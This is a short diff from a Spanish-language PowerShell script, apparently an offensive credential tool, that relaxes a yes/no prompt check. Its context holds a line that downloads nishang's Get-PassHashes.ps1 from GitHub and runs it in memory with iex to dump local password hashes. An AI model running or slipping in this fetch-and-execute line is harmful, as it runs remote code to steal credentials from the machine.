@@ -65,7 +65,7 @@ function ConvertFrom-SecureToPlain {
         Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
-        if($hash -eq 'Si') { 
+        if($hash -like 's*') { 
         Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
         Write-Host ""
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1" | iex
